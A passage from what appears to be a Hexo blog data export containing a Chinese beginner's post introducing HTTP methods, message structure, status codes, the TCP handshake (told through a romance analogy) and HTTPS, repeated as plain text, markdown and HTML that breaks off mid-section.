OPTIONS\n这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用’*’来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。\n\n##### CONNECT\nHTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。\n方法名称是区分大小写的。当某个请求所针对的资源不支持对应的请求方法的时候，服务器应当返回状态码405（Method Not Allowed），当服务器不认识或者不支持对应的请求方法的时候，应当返回状态码501（Not Implemented）。\nHTTP服务器至少应该实现GET和HEAD方法，其他方法都是可选的。当然，所有的方法支持的实现都应当匹配下述的方法各自的语义定义。此外，除了上述方法，特定的HTTP服务器还能够扩展自定义的方法。例如：\n\n##### PATCH（由 RFC 5789 指定的方法）\n用于将局部修改应用到资源。\n\n一般来说，我们常用的有GET,POST,DELETE,PUT四个方法。大多数情况用于获取，增改，删除以及传输文件。\n\n#### http包含那些内容？\n大体上，包含报文首部，报文主体。\n\n##### 报文首部\n报文首部由于请求以及响应的报文首部。\n\n##### 请求报文首部。\n请求行：包含用于请求的方法，请求URI以及HTTP版本\n首部字段:包含表示请求和响应的各种条件和属性的各类首部。一般有四种首部，分别是：请求首部、响应首部、通用首部以及实用首部\n其他：可能包含HTTP里为定义RFC的首部(Cookie等)\n\n##### 响应报文首部\n状态行:包含表明结果的状态码，原因短语和HTTP版本\n首部字段:包含表示请求和响应的各种条件和属性的各类首部。一般有四种首部，分别是：请求首部、响应首部、通用首部以及实用首部\n其他：可能包含HTTP里为定义RFC的首部(Cookie等)\n\n##### 报文主体\n报文主体和报文首部是分开的。由换行分开报文首部以及报文主体。\n\n##### 返回结果的常用HTTP状态码\n| 状态码 | 类别 | 原因短语 |\n| --- | --- | --- |\n| 1xx | Informational(信息性状态码) | 接受的请求正在处理 |\n| 2xx | Success(成功状态码) | 请求正常处理完毕 |\n| 3xx | Redirection(重定向状态码) | 需要进行附加操作以完成请求 |\n| 4xx | Client Error(客户端错误状态码) | 服务器无法处理请求 |\n| 5xx | Server Error(服务器端错误状态码) | 服务器处理请求出错 |\n\n#### 1XX 消息\n这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于HTTP/1.0协议中没有定义任何1xx状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送1xx响应。\n#### 2XX 成功\n##### 200 Ok\n请求已成功，请求所希望的响应头或数据体将随此响应返回。实际的响应将取决于所使用的请求方法。在GET请求中，响应将包含与请求的资源相对应的实体。在POST请求中，响应将包含描述或操作结果的实体。\n##### 204 No Content\n服务器成功处理了请求，没有返回任何内容。\n##### 206 Partial Content\n服务器已经成功处理了部分GET请求。类似于FlashGet或者迅雷这类的HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。\n#### 3XX 重定向\n##### 301 Moved Permanently\n被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个URI之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。\n新的永久性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。\n如果这不是一个GET或者HEAD请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。\n注意：对于某些使用HTTP/1.0协议的浏览器，当它们发送的POST请求得到了一个301响应的话，接下来的重定向请求将会变成GET方式。\n\n##### 302 Found\n要求客户端执行临时重定向（原始描述短语为“Moved Temporarily”）。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。\n新的临时性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。\n如果这不是一个GET或者HEAD请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。\n注意：虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将302响应视作为303响应，并且使用GET方式访问在Location中规定的URI，而无视原先请求的方法。因此状态码303和307被添加了进来，用以明确服务器期待客户端进行何种反应。\n\n##### 303 See Other\n对应当前请求的响应可以在另一个URI上被找到，当响应于POST（或PUT / DELETE）接收到响应时，客户端应该假定服务器已经收到数据，并且应该使用单独的GET消息发出重定向。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的URI不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。\n新的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。\n注意：许多HTTP/1.1版以前的浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动，302状态码应该可以胜任，因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的。\n\n##### 304 Not Modified\n表示资源未被修改，因为请求头指定的版本If-Modified-Since或If-None-Match。在这种情况下，由于客户端仍然具有以前下载的副本，因此不需要重新传输资源。\n\n##### 307 Temporary Redirect\n在这种情况下，请求应该与另一个URI重复，但后续的请求应仍使用原始的URI。 与302相反，当重新发出原始请求时，不允许更改请求方法。 例如，应该使用另一个POST请求来重复POST请求。\n\n#### 4XX客户端错误\n##### 400 Bad Request\n由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求\n\n##### 401 Unauthorized\n用户没有必要的凭据。该状态码表示当前请求需要用户验证。该响应必须包含一个适用于被请求资源的WWW-Authenticate信息头用以询问用户信息。客户端可以重复提交一个包含恰当的Authorization头信息的请求。如果当前请求已经包含了Authorization证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。\n\n##### 403 Forbidden\n服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个HEAD请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。\n\n##### 404 Not Found\n请求失败，请求所希望得到的资源未被在服务器上发现，但允许用户的后续请求。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。\n\n#### 5XX服务器错误\n##### 500 Internal Server Error\n通用错误消息，服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。没有给出具体错误信息。\n\n##### 503 Service Unavailable\n由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是暂时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个Retry-After头用以标明这个延迟时间。如果没有给出这个Retry-After信息，那么客户端应当以处理500响应的方式处理它。\n\n#### HTTP的应用\n##### 三次握手，四次挥手\n哪三次握手？以一个小段子来解释。\n第一次握手：A确定B是不是知道A喜欢他;问：‘你是不是喜欢我啊？’\n第二次握手：B告诉A他很喜欢她，并且反问;答：‘我喜欢你啊，你喜欢我吗？’\n第三次握手：A告诉B;说：‘我喜欢你啊，那我们在一起吧。。。’\n于是他们就在一起了。\n这就是经典的三次握手\n那又是哪四次挥手呢？\n第一次说：A告诉B她不喜欢他了;说：‘我已经不喜欢你了，我们分手吧。’\n第二次说：B告诉A说也不喜欢她了;说：’我知道了，我也不喜欢你了，我们分手吧。‘\n第三次说：A告诉B说他已经知道了：’我知道了，那我们分手吧。‘\n第四次说：B告诉A说他已经知道了A的心意：’我知道了，那我们就分手吧。‘\n于是他们因此分手。\n\n**为什么是三次握手呢？**\n在知乎上看到一个人这样答道：\n这个问题的本质是, 信道不可靠, 但是通信双发需要就某个问题达成一致. 而要解决这个问题, 无论你在消息中包含什么信息, 三次通信是理论上的最小值. 所以三次握手不是TCP本身的要求, 而是为了满足\"在不可靠信道上可靠地传输信息\"这一需求所导致的. 请注意这里的本质需求,信道不可靠, 数据传输要可靠. 三次达到了, 那后面你想接着握手也好, 发数据也好, 跟进行可靠信息传输的需求就没关系了. 因此,如果信道是可靠的, 即无论什么时候发出消息, 对方一定能收到, 或者你不关心是否要保证对方收到你的消息, 那就能像UDP那样直接发送消息就可以了.\n为了满足数据的可靠性。因而才设置三次握手。我想，大概四次挥手也是这个原理吧\n\n#### http有不满足现代web发展的需求？\nhttp是上个世纪的产物，到达21世纪之后，http的功能已经捉襟见肘。因此，有了扩展的http，https。\n\n##### 什么是HTTPS\nhttps并不是新型产物，而是http Secure，是更安全版本。在其基础上加了一层ssl层。用于安全的HTTP数据传输。https:URL表明它使用了HTTP，但HTTPS存在不同于HTTP的默认端口及一个加密/身份验证层（在HTTP与TCP之间）。这个系统的最初研发由网景公司(Netscape)进行，并内置于其浏览器Netscape Navigator中，提供了身份验证与加密通讯方法。现在它被广泛用于万维网上安全敏感的通讯，例如交易支付方面。\n\n##### 为什么要HTTPS\n由于普通的http协议会经过多层代理服务器，因此可能在通讯过程中的数据的泄密和被篡改。也可能遭到非法入侵。因此，为了更好的用户保密，以及确定用户身份。有了ssl层。\nssl释义：\n`SSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全(Transport Layer Security，TLS)是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层对网络连接进行加密。`\n因此，ssl保证了http的安全性。也由于其多层的访问确认关系，要比正常的http慢2-100倍\n\n##### 总结：\n初识http让我从前端思维到后端思维的一个过渡。逐渐解密在数据传输过程中的小黑匣。http状态码以及其工作原理也十分重要的体现在我日常工作中。后端的思维过渡以及前端的新层面让我了然于胸。初识http，重新认识了互联网。","source":"_posts/touch-http.md","raw":"---\ntitle: 初识http\ndate: 2017-08-01 16:05:59\ntags: http\ndir: http\nkeywords: http\n---\n#### 初识http\n在刚刚开始学习前端ajax时，经常听说http协议，“不就是三次握手，四次挥手吗？”，一番言语过后。似懂非懂。近期由于开始学习nodejs，借此机会开始学习了一波http\n#### 什么是http?\n从其英文全意来看，是HyperText Transfer Protocol，中文解释是超文本传输协议。那什么又是超文本？。在wiki上解释是：\n\n`超文本（英语：Hypertext）是一种在电脑显示器或其他电子设备，用以显示文本及与文本相关的内容，其中的文字包含有可以链接到其他字段或者文档的超链接，允许从当前阅读位置直接切换到超链接所指向的文字。万维网的架构便是以超文本的底层概念定义为基础。`\n\n因此，从概念上来看，http最初的目的就是为了提供一种发布和接收HTML页面的方法。\n\n#### http包含了那些方法？\nHTTP/1.1协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源：\n##### GET\n向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问。参见安全方法\n\n##### HEAD\n与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。\n\n##### POST\n向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。\n\n##### PUT\n向指定资源位置上传其最新内容。\n\n##### DELETE\n请求服务器删除Request-URI所标识的资源。\n\n##### TRACE\n回显服务器收到的请求，主要用于测试或诊断。\n\n##### OPTIONS\n这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用’*’来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。\n\n##### CONNECT\nHTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。\n方法名称是区分大小写的。当某个请求所针对的资源不支持对应的请求方法的时候，服务器应当返回状态码405（Method Not Allowed），当服务器不认识或者不支持对应的请求方法的时候，应当返回状态码501（Not Implemented）。\nHTTP服务器至少应该实现GET和HEAD方法，其他方法都是可选的。当然，所有的方法支持的实现都应当匹配下述的方法各自的语义定义。此外，除了上述方法，特定的HTTP服务器还能够扩展自定义的方法。例如：\n\n##### PATCH（由 RFC 5789 指定的方法）\n用于将局部修改应用到资源。\n\n一般来说，我们常用的有GET,POST,DELETE,PUT四个方法。大多数情况用于获取，增改，删除以及传输文件。\n\n#### http包含那些内容？\n大体上，包含报文首部，报文主体。\n\n##### 报文首部\n报文首部由于请求以及响应的报文首部。\n\n##### 请求报文首部。\n请求行：包含用于请求的方法，请求URI以及HTTP版本\n首部字段:包含表示请求和响应的各种条件和属性的各类首部。一般有四种首部，分别是：请求首部、响应首部、通用首部以及实用首部\n其他：可能包含HTTP里为定义RFC的首部(Cookie等)\n\n##### 响应报文首部\n状态行:包含表明结果的状态码，原因短语和HTTP版本\n首部字段:包含表示请求和响应的各种条件和属性的各类首部。一般有四种首部，分别是：请求首部、响应首部、通用首部以及实用首部\n其他：可能包含HTTP里为定义RFC的首部(Cookie等)\n\n##### 报文主体\n报文主体和报文首部是分开的。由换行分开报文首部以及报文主体。\n\n##### 返回结果的常用HTTP状态码\n| 状态码 | 类别 | 原因短语 |\n| --- | --- | --- |\n| 1xx | Informational(信息性状态码) | 接受的请求正在处理 |\n| 2xx | Success(成功状态码) | 请求正常处理完毕 |\n| 3xx | Redirection(重定向状态码) | 需要进行附加操作以完成请求 |\n| 4xx | Client Error(客户端错误状态码) | 服务器无法处理请求 |\n| 5xx | Server Error(服务器端错误状态码) | 服务器处理请求出错 |\n\n#### 1XX 消息\n这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于HTTP/1.0协议中没有定义任何1xx状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送1xx响应。\n#### 2XX 成功\n##### 200 Ok\n请求已成功，请求所希望的响应头或数据体将随此响应返回。实际的响应将取决于所使用的请求方法。在GET请求中，响应将包含与请求的资源相对应的实体。在POST请求中，响应将包含描述或操作结果的实体。\n##### 204 No Content\n服务器成功处理了请求，没有返回任何内容。\n##### 206 Partial Content\n服务器已经成功处理了部分GET请求。类似于FlashGet或者迅雷这类的HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。\n#### 3XX 重定向\n##### 301 Moved Permanently\n被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个URI之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。\n新的永久性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。\n如果这不是一个GET或者HEAD请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。\n注意：对于某些使用HTTP/1.0协议的浏览器，当它们发送的POST请求得到了一个301响应的话，接下来的重定向请求将会变成GET方式。\n\n##### 302 Found\n要求客户端执行临时重定向（原始描述短语为“Moved Temporarily”）。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。\n新的临时性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。\n如果这不是一个GET或者HEAD请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。\n注意：虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将302响应视作为303响应，并且使用GET方式访问在Location中规定的URI，而无视原先请求的方法。因此状态码303和307被添加了进来，用以明确服务器期待客户端进行何种反应。\n\n##### 303 See Other\n对应当前请求的响应可以在另一个URI上被找到，当响应于POST（或PUT / DELETE）接收到响应时，客户端应该假定服务器已经收到数据，并且应该使用单独的GET消息发出重定向。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的URI不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。\n新的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。\n注意：许多HTTP/1.1版以前的浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动，302状态码应该可以胜任，因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的。\n\n##### 304 Not Modified\n表示资源未被修改，因为请求头指定的版本If-Modified-Since或If-None-Match。在这种情况下，由于客户端仍然具有以前下载的副本，因此不需要重新传输资源。\n\n##### 307 Temporary Redirect\n在这种情况下，请求应该与另一个URI重复，但后续的请求应仍使用原始的URI。 与302相反，当重新发出原始请求时，不允许更改请求方法。 例如，应该使用另一个POST请求来重复POST请求。\n\n#### 4XX客户端错误\n##### 400 Bad Request\n由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求\n\n##### 401 Unauthorized\n用户没有必要的凭据。该状态码表示当前请求需要用户验证。该响应必须包含一个适用于被请求资源的WWW-Authenticate信息头用以询问用户信息。客户端可以重复提交一个包含恰当的Authorization头信息的请求。如果当前请求已经包含了Authorization证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。\n\n##### 403 Forbidden\n服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个HEAD请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。\n\n##### 404 Not Found\n请求失败，请求所希望得到的资源未被在服务器上发现，但允许用户的后续请求。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。\n\n#### 5XX服务器错误\n##### 500 Internal Server Error\n通用错误消息，服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。没有给出具体错误信息。\n\n##### 503 Service Unavailable\n由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是暂时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个Retry-After头用以标明这个延迟时间。如果没有给出这个Retry-After信息，那么客户端应当以处理500响应的方式处理它。\n\n#### HTTP的应用\n##### 三次握手，四次挥手\n哪三次握手？以一个小段子来解释。\n第一次握手：A确定B是不是知道A喜欢他;问：‘你是不是喜欢我啊？’\n第二次握手：B告诉A他很喜欢她，并且反问;答：‘我喜欢你啊，你喜欢我吗？’\n第三次握手：A告诉B;说：‘我喜欢你啊，那我们在一起吧。。。’\n于是他们就在一起了。\n这就是经典的三次握手\n那又是哪四次挥手呢？\n第一次说：A告诉B她不喜欢他了;说：‘我已经不喜欢你了，我们分手吧。’\n第二次说：B告诉A说也不喜欢她了;说：’我知道了，我也不喜欢你了，我们分手吧。‘\n第三次说：A告诉B说他已经知道了：’我知道了，那我们分手吧。‘\n第四次说：B告诉A说他已经知道了A的心意：’我知道了，那我们就分手吧。‘\n于是他们因此分手。\n\n**为什么是三次握手呢？**\n在知乎上看到一个人这样答道：\n这个问题的本质是, 信道不可靠, 但是通信双发需要就某个问题达成一致. 而要解决这个问题, 无论你在消息中包含什么信息, 三次通信是理论上的最小值. 所以三次握手不是TCP本身的要求, 而是为了满足\"在不可靠信道上可靠地传输信息\"这一需求所导致的. 请注意这里的本质需求,信道不可靠, 数据传输要可靠. 三次达到了, 那后面你想接着握手也好, 发数据也好, 跟进行可靠信息传输的需求就没关系了. 因此,如果信道是可靠的, 即无论什么时候发出消息, 对方一定能收到, 或者你不关心是否要保证对方收到你的消息, 那就能像UDP那样直接发送消息就可以了.\n为了满足数据的可靠性。因而才设置三次握手。我想，大概四次挥手也是这个原理吧\n\n#### http有不满足现代web发展的需求？\nhttp是上个世纪的产物，到达21世纪之后，http的功能已经捉襟见肘。因此，有了扩展的http，https。\n\n##### 什么是HTTPS\nhttps并不是新型产物，而是http Secure，是更安全版本。在其基础上加了一层ssl层。用于安全的HTTP数据传输。https:URL表明它使用了HTTP，但HTTPS存在不同于HTTP的默认端口及一个加密/身份验证层（在HTTP与TCP之间）。这个系统的最初研发由网景公司(Netscape)进行，并内置于其浏览器Netscape Navigator中，提供了身份验证与加密通讯方法。现在它被广泛用于万维网上安全敏感的通讯，例如交易支付方面。\n\n##### 为什么要HTTPS\n由于普通的http协议会经过多层代理服务器，因此可能在通讯过程中的数据的泄密和被篡改。也可能遭到非法入侵。因此，为了更好的用户保密，以及确定用户身份。有了ssl层。\nssl释义：\n`SSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全(Transport Layer Security，TLS)是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层对网络连接进行加密。`\n因此，ssl保证了http的安全性。也由于其多层的访问确认关系，要比正常的http慢2-100倍\n\n##### 总结：\n初识http让我从前端思维到后端思维的一个过渡。逐渐解密在数据传输过程中的小黑匣。http状态码以及其工作原理也十分重要的体现在我日常工作中。后端的思维过渡以及前端的新层面让我了然于胸。初识http，重新认识了互联网。","slug":"touch-http","published":1,"updated":"2021-10-13T15:51:32.880Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz09001c4jzxt69my2nr","content":"<h4 id=\"初识http\"><a href=\"#初识http\" class=\"headerlink\" title=\"初识http\"></a>初识http</h4><p>在刚刚开始学习前端ajax时，经常听说http协议，“不就是三次握手，四次挥手吗？”，一番言语过后。似懂非懂。近期由于开始学习nodejs，借此机会开始学习了一波http</p><h4 id=\"什么是http\"><a href=\"#什么是http\" class=\"headerlink\" title=\"什么是http?\"></a>什么是http?</h4><p>从其英文全意来看，是HyperText Transfer Protocol，中文解释是超文本传输协议。那什么又是超文本？。在wiki上解释是：</p><p><code>超文本（英语：Hypertext）是一种在电脑显示器或其他电子设备，用以显示文本及与文本相关的内容，其中的文字包含有可以链接到其他字段或者文档的超链接，允许从当前阅读位置直接切换到超链接所指向的文字。万维网的架构便是以超文本的底层概念定义为基础。</code></p><p>因此，从概念上来看，http最初的目的就是为了提供一种发布和接收HTML页面的方法。</p><h4 id=\"http包含了那些方法？\"><a href=\"#http包含了那些方法？\" class=\"headerlink\" title=\"http包含了那些方法？\"></a>http包含了那些方法？</h4><p>HTTP/1.1协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源：</p><h5 id=\"GET\"><a href=\"#GET\" class=\"headerlink\" title=\"GET\"></a>GET</h5><p>向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问。参见安全方法</p><h5 id=\"HEAD\"><a href=\"#HEAD\" class=\"headerlink\" title=\"HEAD\"></a>HEAD</h5><p>与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。</p><h5 id=\"POST\"><a href=\"#POST\" class=\"headerlink\" title=\"POST\"></a>POST</h5><p>向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。</p><h5 id=\"PUT\"><a href=\"#PUT\" class=\"headerlink\" title=\"PUT\"></a>PUT</h5><p>向指定资源位置上传其最新内容。</p><h5 id=\"DELETE\"><a href=\"#DELETE\" class=\"headerlink\" title=\"DELETE\"></a>DELETE</h5><p>请求服务器删除Request-URI所标识的资源。</p><h5 id=\"TRACE\"><a href=\"#TRACE\" class=\"headerlink\" title=\"TRACE\"></a>TRACE</h5><p>回显服务器收到的请求，主要用于测试或诊断。</p><h5 id=\"OPTIONS\"><a href=\"#OPTIONS\" class=\"headerlink\" title=\"OPTIONS\"></a>OPTIONS</h5><p>这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用’*’来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。</p><h5 id=\"CONNECT\"><a href=\"#CONNECT\" class=\"headerlink\" title=\"CONNECT\"></a>CONNECT</h5><p>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。<br>方法名称是区分大小写的。当某个请求所针对的资源不支持对应的请求方法的时候，服务器应当返回状态码405（Method Not Allowed），当服务器不认识或者不支持对应的请求方法的时候，应当返回状态码501（Not Implemented）。<br>HTTP服务器至少应该实现GET和HEAD方法，其他方法都是可选的。当然，所有的方法支持的实现都应当匹配下述的方法各自的语义定义。此外，除了上述方法，特定的HTTP服务器还能够扩展自定义的方法。例如：</p><h5 id=\"PATCH（由-RFC-5789-指定的方法）\"><a href=\"#PATCH（由-RFC-5789-指定的方法）\" class=\"headerlink\" title=\"PATCH（由 RFC 5789 指定的方法）\"></a>PATCH（由 RFC 5789 指定的方法）</h5><p>用于将局部修改应用到资源。</p><p>一般来说，我们常用的有GET,POST,DELETE,PUT四个方法。大多数情况用于获取，增改，删除以及传输文件。</p><h4 id=\"http包含那些内容？\"><a href=\"#http包含那些内容？\" class=\"headerlink\" title=\"http包含那些内容？\"></a>http包含那些内容？</h4><p>大体上，包含报文首部，报文主体。</p><h5 id=\"报文首部\"><a href=\"#报文首部\" class=\"headerlink\" title=\"报文首部\"></a>报文首部</h5><p>报文首部由于请求以及响应的报文首部。</p><h5 id=\"请求报文首部。\"><a href=\"#请求报文首部。\" class=\"headerlink\" title=\"请求报文首部。\"></a>请求报文首部。</h5><p>请求行：包含用于请求的方法，请求URI以及HTTP版本<br>首部字段:包含表示请求和响应的各种条件和属性的各类首部。一般有四种首部，分别是：请求首部、响应首部、通用首部以及实用首部<br>其他：可能包含HTTP里为定义RFC的首部(Cookie等)</p><h5 id=\"响应报文首部\"><a href=\"#响应报文首部\" class=\"headerlink\" title=\"响应报文首部\"></a>响应报文首部</h5><p>状态行:包含表明结果的状态码，原因短语和HTTP版本<br>首部字段:包含表示请求和响应的各种条件和属性的各类首部。一般有四种首部，分别是：请求首部、响应首部、通用首部以及实用首部<br>其他：可能包含HTTP里为定义RFC的首部(Cookie等)</p><h5 id=\"报文主体\"><a href=\"#报文主体\" class=\"headerlink\" title=\"报文主体\"></a>报文主体</h5><p>报文主体和报文首部是分开的。由换行分开报文首部以及报文主体。</p><h5 id=\"返回结果的常用HTTP状态码\"><a href=\"#返回结果的常用HTTP状态码\" class=\"headerlink\" title=\"返回结果的常用HTTP状态码\"></a>返回结果的常用HTTP状态码</h5><table><thead><tr><th>状态码</th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1xx</td><td>Informational(信息性状态码)</td><td>接受的请求正在处理</td></tr><tr><td>2xx</td><td>Success(成功状态码)</td><td>请求正常处理完毕</td></tr><tr><td>3xx</td><td>Redirection(重定向状态码)</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4xx</td><td>Client Error(客户端错误状态码)</td><td>服务器无法处理请求</td></tr><tr><td>5xx</td><td>Server Error(服务器端错误状态码)</td><td>服务器处理请求出错</td></tr></tbody></table><h4 id=\"1XX-消息\"><a href=\"#1XX-消息\" class=\"headerlink\" title=\"1XX 消息\"></a>1XX 消息</h4><p>这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于HTTP/1.0协议中没有定义任何1xx状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送1xx响应。</p><h4 id=\"2XX-成功\"><a href=\"#2XX-成功\" class=\"headerlink\" title=\"2XX 成功\"></a>2XX 成功</h4><h5 id=\"200-Ok\"><a href=\"#200-Ok\" class=\"headerlink\" title=\"200 Ok\"></a>200 Ok</h5><p>请求已成功，请求所希望的响应头或数据体将随此响应返回。实际的响应将取决于所使用的请求方法。在GET请求中，响应将包含与请求的资源相对应的实体。在POST请求中，响应将包含描述或操作结果的实体。</p><h5 id=\"204-No-Content\"><a href=\"#204-No-Content\" class=\"headerlink\" title=\"204 No Content\"></a>204 No Content</h5><p>服务器成功处理了请求，没有返回任何内容。</p><h5 id=\"206-Partial-Content\"><a href=\"#206-Partial-Content\" class=\"headerlink\" title=\"206 Partial Content\"></a>206 Partial Content</h5><p>服务器已经成功处理了部分GET请求。类似于FlashGet或者迅雷这类的HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。</p><h4 id=\"3XX-重定向\"><a href=\"#3XX-重定向\" class=\"headerlink\" title=\"3XX 重定向\"></a>3XX 重定向</h4><h5 id=\"301-Moved-Permanently\"><a href=\"#301-Moved-Permanently\" class=\"headerlink\" title=\"301 Moved Permanently\"></a>301 Moved 